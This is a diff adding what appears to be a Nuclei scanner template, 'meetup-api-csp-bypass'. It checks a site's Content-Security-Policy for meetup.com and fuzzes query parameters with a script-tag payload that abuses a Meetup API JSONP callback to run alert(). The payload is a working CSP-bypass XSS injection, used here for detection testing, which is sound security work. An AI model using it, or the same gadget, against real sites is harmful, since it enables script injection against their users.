@@ -1,0 +1,55 @@
+id: meetup-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Meetup API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,meetup-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "meetup.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: meetup_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.meetup.com/Toronto-Code-Mentoring/events?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "meetup_api_csp_xss == true"
+# digest: 4a0a00473045022100f57ced28116790ae9d886c7eee7a76ea4a71e1b72d4685f7dd23ed87a9e0005002204da70bd3d906d934bc1851af5261e7249a421933c4c81234b207a69f43239245:922c64590222798bb761d5b6d8e72950
